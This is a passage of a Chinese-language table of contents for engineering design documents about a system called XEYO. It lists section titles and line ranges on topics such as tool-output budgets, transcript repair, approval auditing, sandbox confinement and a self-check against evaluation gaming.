| 11 | 3.1 总表 | L159–175 | 17 |
| 12 | 3.2 一句话排序理由 | L176–186 | 11 |
| 13 | §4 逐项详解 | L187–188 | 2 |
| 14 | P0-1 工具结果头尾预算 + spill 可取回 | L189–209 | 21 |
| 15 | P0-2 JSONL 撕裂尾修复 + 跨进程租约 | L210–232 | 23 |
| 16 | P1-3 投影层加通用 `replace` 算子 + 来源追踪 | L233–255 | 23 |
| 17 | P1-4 压缩事务化：括号事务 + 工具配对平衡 | L256–280 | 25 |
| 18 | P1-5 命名事件瀑布（先只做"命名"） | L281–313 | 33 |
| 19 | P1-6 审批审计配对 + 审批策略不入 transcript | L314–335 | 22 |
| 20 | P2-1 沙箱 `confine(argv, policy)` seam + Windows restricted-token 后端 ★最大项 | L336–379 | 44 |
| 21 | P2-2 会话自查询工具 | L380–391 | 12 |
| 22 | P2-3 质量门分级 | L392–406 | 15 |
| 23 | §5 红线自检：逐条过应试性审查 | L407–410 | 4 |
| 24 | 5.1 R1 产品受益（不是只评测受益） | L411–427 | 17 |
| 25 | 5.2 R2 无评测分支（**唯一需要注意的一项**） | L428–441 | 14 |
| 26 | 5.3 R3 信息纪律（不注入引擎无法核实的事实、不做导演） | L442–453 | 12 |
| 27 | 5.4 R4 收益可证伪 | L454–459 | 6 |
| 28 | 5.5 自检结论 | L460–465 | 6 |
| 29 | §6 建议的实施顺序与依赖 | L466–498 | 33 |
| 30 | §7 明确不建议照搬的清单 | L499–517 | 19 |
| 31 | §8 结论（一句话级） | L518–532 | 15 |

### R7 · 决策 B·高杠杆收益评估

路径 `docs/XEYO-高杠杆优化点-收益评估.md` · 共 720 行 · 11 节

| # | 节标题 | 源行号 | 行数 |
|---|---|---|---|
| 0 | XEYO 高杠杆优化点评估（五轮总结 · 收益视角） | L1–11 | 11 |
| 1 | §0 一句话结论 | L12–29 | 18 |
| 2 | §1 先更正：三项被误判为"待做"的其实早已存在 | L30–103 | 74 |
| 3 | §2 剔除假差距后的真实候选池 | L104–124 | 21 |
| 4 | §3 评分口径：为什么要把"收益"和"适配"拆开 | L125–161 | 37 |
| 5 | §4 全候选评分表 | L162–213 | 52 |
| 6 | §5 收益巨大的点，逐个论证 | L214–528 | 315 |
| 7 | §6 组合：为什么这几个点的收益是**乘法**而不是加法 | L529–604 | 76 |
| 8 | §7 反面清单：看起来收益大，其实不是 | L605–674 | 70 |
| 9 | §8 一页结论 | L675–707 | 33 |
| 10 | 附：本文的取证边界 | L708–720 | 13 |